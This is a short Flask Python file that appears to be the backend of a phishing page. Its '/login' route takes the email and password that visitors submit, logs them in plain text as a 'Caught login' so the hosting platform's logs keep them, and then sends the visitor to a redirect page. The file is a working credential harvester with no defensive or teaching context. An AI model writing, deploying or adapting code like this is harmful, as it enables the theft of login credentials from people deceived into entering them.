from flask import Flask, render_template, request
from datetime import datetime
import logging

app = Flask(__name__)

# Configure logging to write to stdout (so Render sees it)
logging.basicConfig(level=logging.INFO)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    logging.info(f"[+] {timestamp} — Caught login -> Email: {email}, Password: {password}")
    return render_template('redirect.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
